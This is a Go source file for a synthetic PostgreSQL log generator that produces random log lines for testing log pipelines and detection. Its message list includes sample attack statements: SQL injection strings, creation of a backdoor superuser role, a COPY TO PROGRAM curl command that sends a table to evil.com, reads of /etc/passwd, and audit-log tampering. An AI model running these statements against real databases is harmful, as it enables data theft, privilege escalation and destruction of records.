package postgres

import (
	"context"
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"

	"github.com/cenkalti/backoff/v4"
	"github.com/observiq/blitz/output"
	"go.opentelemetry.io/otel"
	"go.opentelemetry.io/otel/attribute"
	"go.opentelemetry.io/otel/metric"
	"go.uber.org/zap"
)

const (
	// componentName is the component identifier for metrics
	componentName = "generator_postgres"

	// meterName is the OpenTelemetry meter name
	meterName = "blitz-generator"

	// metric names
	metricLogsGenerated = "blitz.generator.logs.generated"
	metricWorkersActive = "blitz.generator.workers.active"
	metricWriteErrors   = "blitz.generator.write.errors"

	// error types
	errorTypeUnknown = "unknown"
	errorTypeTimeout = "timeout"

	// severity levels
	severityLog     = "LOG"
	severityError   = "ERROR"
	severityFatal   = "FATAL"
	severityPanic   = "PANIC"
	severityWarning = "WARNING"
	severityNotice  = "NOTICE"
	severityDebug   = "DEBUG"
	severityInfo    = "INFO"
)

// postgresLogData represents the data needed to generate a PostgreSQL log entry
type postgresLogData struct {
	timestamp  time.Time
	processID  int
	user       string
	database   string
	app        string
	clientAddr string
	severity   string
	message    string
}

// Generator generates PostgreSQL log format log data
type Generator struct {
	logger  *zap.Logger
	workers int
	rate    time.Duration
	wg      sync.WaitGroup
	stopCh  chan struct{}
	meter   metric.Meter

	// Metrics
	postgresLogsGenerated metric.Int64Counter
	postgresActiveWorkers metric.Int64Gauge
	postgresWriteErrors   metric.Int64Counter
}

// Predefined lists for fast random generation
var (
	users = []string{
		"postgres",
		"admin",
		"app_user",
		"readonly_user",
		"write_user",
		"analytics_user",
		"backup_user",
		"monitoring_user",
	}

	databases = []string{
		"postgres",
		"mydb",
		"appdb",
		"analytics",
		"warehouse",
		"testdb",
		"production",
		"staging",
	}

	applications = []string{
		"psql",
		"pgAdmin",
		"pg_dump",
		"pg_restore",
		"application",
		"webapp",
		"api_server",
		"worker",
		"cron",
		"backup_script",
		"-", // empty application name
	}

	logMessages = []struct {
		severity string
		message  string
	}{
		// Normal operations
		{severityLog, "statement: SELECT * FROM users WHERE id = $1"},
		{severityLog, "statement: INSERT INTO orders (user_id, total) VALUES ($1, $2)"},
		{severityLog, "statement: UPDATE products SET stock = stock - $1 WHERE id = $2"},
		{severityLog, "statement: DELETE FROM sessions WHERE expires_at < NOW()"},
		{severityLog, "statement: BEGIN"},
		{severityLog, "statement: COMMIT"},
		{severityLog, "statement: ROLLBACK"},
		{severityLog, "statement: SELECT COUNT(*) FROM transactions WHERE created_at > $1"},
		{severityLog, "statement: CREATE INDEX idx_user_email ON users(email)"},
		{severityLog, "statement: ANALYZE users"},
		{severityLog, "statement: VACUUM ANALYZE orders"},
		{severityLog, "duration: 12.345 ms"},
		{severityLog, "duration: 45.678 ms"},
		{severityLog, "duration: 123.456 ms"},
		{severityLog, "duration: 1.234 ms"},
		{severityLog, "connection received: host=127.0.0.1 port=54321"},
		{severityLog, "connection authorized: user=postgres database=postgres"},
		{severityLog, "disconnection: session time: 0:05:23.123"},
		{severityLog, "checkpoint starting: time"},
		{severityLog, "checkpoint complete: wrote 1024 buffers (6.3%); 0 WAL file(s) added, 0 removed, 1 recycled; write=12.345 s, sync=0.123 s, total=12.468 s; sync files=10, longest=0.045 s, average=0.012 s; distance=16384 kB, estimate=24576 kB"},
		{severityNotice, "relation \"public.users\" already exists, skipping"},
		{severityWarning, "there is no transaction in progress"},
		{severityWarning, "column \"email\" does not exist"},
		{severityError, "syntax error at or near \"SELECT\""},
		{severityError, "relation \"nonexistent\" does not exist"},
		{severityError, "duplicate key value violates unique constraint \"users_pkey\""},
		{severityError, "column \"invalid_col\" does not exist"},
		{severityError, "permission denied for table \"users\""},
		{severityError, "connection to server at \"192.168.1.100\", port 5432 failed: Connection refused"},
		{severityInfo, "database system was shut down at 2024-01-15 10:23:45 UTC"},
		{severityInfo, "database system is ready to accept connections"},
		{severityInfo, "autovacuum launcher started"},
		{severityInfo, "autovacuum launcher shutting down"},
		{severityDebug, "checkpoint record is at 0/12345678"},
		{severityDebug, "redo record is at 0/12345678; undo record is at 0/0; shutdown TRUE"},

		// Security: Authentication failures (brute force patterns)
		{severityFatal, "password authentication failed for user \"admin\""},
		{severityFatal, "password authentication failed for user \"root\""},
		{severityFatal, "password authentication failed for user \"postgres\""},
		{severityFatal, "password authentication failed for user \"sa\""},
		{severityFatal, "no pg_hba.conf entry for host \"10.0.0.50\", user \"admin\", database \"production\""},
		{severityFatal, "too many connections for role \"app_user\""},
		{severityWarning, "connection rejected: too many connections for database \"production\""},
		{severityError, "authentication failed for user \"backup_admin\": invalid credentials"},

		// Security: SQL injection attempts
		{severityError, "syntax error at or near \"'\" at character 42"},
		{severityLog, "statement: SELECT * FROM users WHERE username = '' OR '1'='1'"},
		{severityLog, "statement: SELECT * FROM users WHERE id = 1; DROP TABLE users;--"},
		{severityLog, "statement: SELECT * FROM accounts WHERE id = 1 UNION SELECT password FROM credentials"},
		{severityLog, "statement: SELECT * FROM products WHERE name = ''; WAITFOR DELAY '00:00:10'--"},
		{severityLog, "statement: SELECT password FROM users WHERE username = 'admin'--"},
		{severityLog, "statement: INSERT INTO users VALUES (1, 'hacker', (SELECT password FROM users WHERE username='admin'))"},
		{severityWarning, "statement execution time exceeded threshold: 30000 ms"},

		// Security: Privilege escalation attempts
		{severityError, "permission denied to create role"},
		{severityError, "must be superuser to alter superuser roles or change superuser attribute"},
		{severityLog, "statement: ALTER ROLE app_user WITH SUPERUSER"},
		{severityLog, "statement: ALTER ROLE readonly_user WITH CREATEROLE CREATEDB"},
		{severityLog, "statement: GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO attacker"},
		{severityLog, "statement: CREATE ROLE backdoor_admin WITH SUPERUSER LOGIN PASSWORD 'hacked123'"},
		{severityError, "permission denied for schema pg_catalog"},
		{severityFatal, "role \"app_user\" is not permitted to log in"},

		// Security: Data exfiltration patterns
		{severityLog, "statement: COPY (SELECT * FROM customers) TO '/tmp/customers_dump.csv'"},
		{severityLog, "statement: COPY users TO PROGRAM 'curl -X POST -d @- http://evil.com/exfil'"},
		{severityLog, "statement: SELECT * FROM credit_cards"},
		{severityLog, "statement: SELECT ssn, dob, full_name FROM pii_data"},
		{severityLog, "statement: pg_dump --table=passwords --data-only production"},
		{severityWarning, "large data transfer detected: 50000 rows returned"},
		{severityLog, "statement: SELECT pg_read_file('/etc/passwd')"},
		{severityLog, "statement: SELECT lo_export(12345, '/tmp/secret.txt')"},

		// Security: Suspicious administrative actions
		{severityLog, "statement: DROP DATABASE production"},
		{severityLog, "statement: TRUNCATE TABLE audit_logs"},
		{severityLog, "statement: DELETE FROM security_events WHERE created_at < NOW()"},
		{severityLog, "statement: ALTER TABLE audit_logs DISABLE TRIGGER ALL"},
		{severityWarning, "parameter \"log_statement\" changed to \"none\""},
		{severityWarning, "parameter \"log_connections\" changed to \"off\""},
		{severityLog, "statement: UPDATE pg_authid SET rolpassword = 'md5' || md5('newpass' || 'postgres')"},

		// Security: Anomalous access patterns
		{severityWarning, "connection from unusual IP range: 185.220.101.0/24 (known Tor exit node)"},
		{severityWarning, "off-hours database access detected from user \"admin\" at 03:24:15 UTC"},
		{severityLog, "connection received: host=192.168.1.100 port=54321 (outside normal subnet)"},
		{severityError, "SSL connection required but client connected without SSL"},
		{severityWarning, "multiple databases accessed in single session: production, staging, backup"},
	}
)

// New creates a new PostgreSQL log generator
func New(logger *zap.Logger, workers int, rate time.Duration) (*Generator, error) {
	if logger == nil {
		return nil, fmt.Errorf("logger cannot be nil")
	}

	if workers < 1 {
		return nil, fmt.Errorf("workers must be 1 or greater, got %d", workers)
	}

	meter := otel.Meter(meterName)

	postgresLogsGenerated, err := meter.Int64Counter(
		metricLogsGenerated,
		metric.WithDescription("Total number of logs generated"),
	)
	if err != nil {
		return nil, fmt.Errorf("create logs generated counter: %w", err)
	}

	postgresActiveWorkers, err := meter.Int64Gauge(
		metricWorkersActive,
		metric.WithDescription("Number of active worker goroutines"),
	)
	if err != nil {
		return nil, fmt.Errorf("create active workers gauge: %w", err)
	}

	postgresWriteErrors, err := meter.Int64Counter(
		metricWriteErrors,
		metric.WithDescription("Total number of write errors"),
	)
	if err != nil {
		return nil, fmt.Errorf("create write errors counter: %w", err)
	}

	return &Generator{
		logger:                logger,
		workers:               workers,
		rate:                  rate,
		stopCh:                make(chan struct{}),
		meter:                 meter,
		postgresLogsGenerated: postgresLogsGenerated,
		postgresActiveWorkers: postgresActiveWorkers,
		postgresWriteErrors:   postgresWriteErrors,
	}, nil
}

// Start starts the PostgreSQL log generator and writes data using the
// provided generator writer.
func (g *Generator) Start(writer output.Writer) error {
	g.logger.Info("Starting PostgreSQL log generator",
		zap.Int("workers", g.workers),
		zap.Duration("rate", g.rate),
	)

	for i := 0; i < g.workers; i++ {
		g.wg.Add(1)
		go g.worker(i, writer)
	}

	return nil
}

// Stop stops the PostgreSQL log generator and waits for all workers to finish.
func (g *Generator) Stop(ctx context.Context) error {
	g.logger.Info("Stopping PostgreSQL log generator")

	close(g.stopCh)

	done := make(chan struct{})
	go func() {
		g.wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		g.logger.Info("PostgreSQL log generator stopped")
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}

// worker is the main worker loop that generates and writes logs
func (g *Generator) worker(workerID int, writer output.Writer) {
	defer g.wg.Done()

	g.postgresActiveWorkers.Record(context.Background(), 1,
		metric.WithAttributeSet(
			attribute.NewSet(
				attribute.String("component", componentName),
				attribute.Int("worker_id", workerID),
			),
		),
	)
	defer g.postgresActiveWorkers.Record(context.Background(), 0,
		metric.WithAttributeSet(
			attribute.NewSet(
				attribute.String("component", componentName),
				attribute.Int("worker_id", workerID),
			),
		),
	)

	backoffConfig := backoff.NewExponentialBackOff()
	backoffConfig.InitialInterval = g.rate
	backoffConfig.MaxInterval = 5 * time.Second
	backoffConfig.MaxElapsedTime = 0

	backoffTicker := backoff.NewTicker(backoffConfig)
	defer backoffTicker.Stop()

	for {
		select {
		case <-g.stopCh:
			g.logger.Debug("Worker stopping", zap.Int("worker_id", workerID))
			return
		case <-backoffTicker.C:
			err := g.generateAndWriteLog(writer, workerID)
			if err != nil {
				g.logger.Error("Failed to write log",
					zap.Int("worker_id", workerID),
					zap.Error(err))
				continue
			}
			backoffConfig.Reset()
		}
	}
}

// generateAndWriteLog generates a random log and writes it
func (g *Generator) generateAndWriteLog(writer output.Writer, workerID int) error {
	logData, err := g.generatePostgresLogData()
	if err != nil {
		g.recordWriteError(errorTypeUnknown, err)
		return fmt.Errorf("generate PostgreSQL log data: %w", err)
	}

	logRecord, err := formatAsPostgres(logData)
	if err != nil {
		g.recordWriteError(errorTypeUnknown, err)
		return fmt.Errorf("format log as PostgreSQL: %w", err)
	}

	g.postgresLogsGenerated.Add(context.Background(), 1,
		metric.WithAttributeSet(
			attribute.NewSet(
				attribute.String("component", componentName),
			),
		),
	)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := writer.Write(ctx, logRecord); err != nil {
		errorType := errorTypeUnknown
		if ctx.Err() == context.DeadlineExceeded {
			errorType = errorTypeTimeout
		}
		g.recordWriteError(errorType, err)
		return err
	}

	return nil
}

// generatePostgresLogData generates random PostgreSQL log data
func (g *Generator) generatePostgresLogData() (*postgresLogData, error) {
	r := rand.New(rand.NewSource(time.Now().UnixNano())) // #nosec G404

	data := &postgresLogData{
		timestamp:  time.Now(),
		processID:  r.Intn(99999) + 1000,                    // #nosec G404
		user:       users[r.Intn(len(users))],               // #nosec G404
		database:   databases[r.Intn(len(databases))],       // #nosec G404
		app:        applications[r.Intn(len(applications))], // #nosec G404
		clientAddr: generateRandomIP(r),
	}

	// Select a random log message
	logEntry := logMessages[r.Intn(len(logMessages))] // #nosec G404
	data.severity = logEntry.severity
	data.message = logEntry.message

	return data, nil
}

// generateRandomIP generates a random IP address
func generateRandomIP(r *rand.Rand) string {
	return fmt.Sprintf("%d.%d.%d.%d",
		r.Intn(256), // #nosec G404
		r.Intn(256), // #nosec G404
		r.Intn(256), // #nosec G404
		r.Intn(256)) // #nosec G404
}

// formatAsPostgres converts postgresLogData to PostgreSQL log format
// Format: %t [%p]: user=%u,db=%d,app=%a,client=%h <severity>: <message>
// Example: 2024-01-15 10:23:45.123 UTC [12345]: user=postgres,db=mydb,app=psql,client=127.0.0.1 LOG:  statement: SELECT * FROM users;
func formatAsPostgres(data *postgresLogData) (output.LogRecord, error) {
	// Format timestamp as PostgreSQL does: YYYY-MM-DD HH:MM:SS.mmm UTC
	timestampStr := data.timestamp.UTC().Format("2006-01-02 15:04:05.000 MST")

	// Format the log line prefix: timestamp [process_id]: user=...,db=...,app=...,client=...
	prefix := fmt.Sprintf("%s [%d]: user=%s,db=%s,app=%s,client=%s",
		timestampStr,
		data.processID,
		data.user,
		data.database,
		data.app,
		data.clientAddr,
	)

	// Format the full log line: prefix <severity>: <message>
	postgresLine := fmt.Sprintf("%s %s:  %s",
		prefix,
		data.severity,
		data.message,
	)

	return output.LogRecord{
		Message: postgresLine,
		ParseFunc: func(message string) (map[string]any, error) {
			parsed := make(map[string]any)

			// Parse timestamp [process_id]: user=...,db=...,app=...,client=... <severity>: <message>
			parts := strings.SplitN(message, "]: ", 2)
			if len(parts) < 2 {
				return parsed, nil
			}

			prefixPart := parts[0]
			rest := parts[1]

			// Extract timestamp and process ID from prefix
			timestampEnd := strings.Index(prefixPart, " [")
			if timestampEnd > 0 {
				parsed["timestamp"] = prefixPart[:timestampEnd]
			}
			processStart := strings.Index(prefixPart, "[")
			processEnd := strings.Index(prefixPart, "]")
			if processStart >= 0 && processEnd > processStart {
				parsed["process_id"] = prefixPart[processStart+1 : processEnd]
			}

			// Parse user=...,db=...,app=...,client=... from prefix
			prefixFields := strings.Split(prefixPart, ",")
			for _, field := range prefixFields {
				if strings.Contains(field, "user=") {
					parsed["user"] = strings.TrimPrefix(field[strings.Index(field, "user="):], "user=")
				}
				if strings.Contains(field, "db=") {
					parsed["database"] = strings.TrimPrefix(field[strings.Index(field, "db="):], "db=")
				}
				if strings.Contains(field, "app=") {
					parsed["app"] = strings.TrimPrefix(field[strings.Index(field, "app="):], "app=")
				}
				if strings.Contains(field, "client=") {
					parsed["client"] = strings.TrimPrefix(field[strings.Index(field, "client="):], "client=")
				}
			}

			// Parse severity and message from rest
			severityParts := strings.SplitN(rest, ": ", 2)
			if len(severityParts) >= 1 {
				parsed["severity"] = strings.TrimSpace(severityParts[0])
			}
			if len(severityParts) >= 2 {
				parsed["message"] = severityParts[1]
			}

			return parsed, nil
		},
		Metadata: output.LogRecordMetadata{
			Timestamp: data.timestamp,
			Severity:  data.severity,
		},
	}, nil
}

// recordWriteError records a write error metric
func (g *Generator) recordWriteError(errorType string, err error) {
	g.postgresWriteErrors.Add(context.Background(), 1,
		metric.WithAttributeSet(
			attribute.NewSet(
				attribute.String("component", componentName),
				attribute.String("error_type", errorType),
			),
		),
	)
	g.logger.Debug("Recorded write error",
		zap.String("error_type", errorType),
		zap.Error(err),
	)
}
